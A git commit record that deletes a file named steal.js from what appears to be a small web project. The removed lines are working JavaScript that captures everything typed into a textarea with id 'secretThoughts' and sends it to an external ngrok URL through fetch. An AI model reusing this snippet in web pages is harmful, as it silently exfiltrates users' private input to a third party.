906d4d5e44ca9a8b119d935d1d6e861fb2ed7d7b
lvpeterson <lv.peterson@yahoo.com>
2025-06-17 22:08:26 -0700

    Delete steal.js

--- steal.js
+++
@@ -1,9 +0,0 @@
-window.addEventListener('DOMContentLoaded', () => { // Need to wait for all DOM to load
-  const textarea = document.getElementById("secretThoughts");
-  // your event listener code here
-  textarea.addEventListener("input", function(e) {
-	  const userInput = e.target.value;
-	  console.log(userInput); // This logs the current input value
-	  fetch(`https://d626-172-88-27-186.ngrok-free.app?text=${encodeURIComponent(userInput)}`, { mode: 'no-cors' }).catch(console.error);
-	});
-});
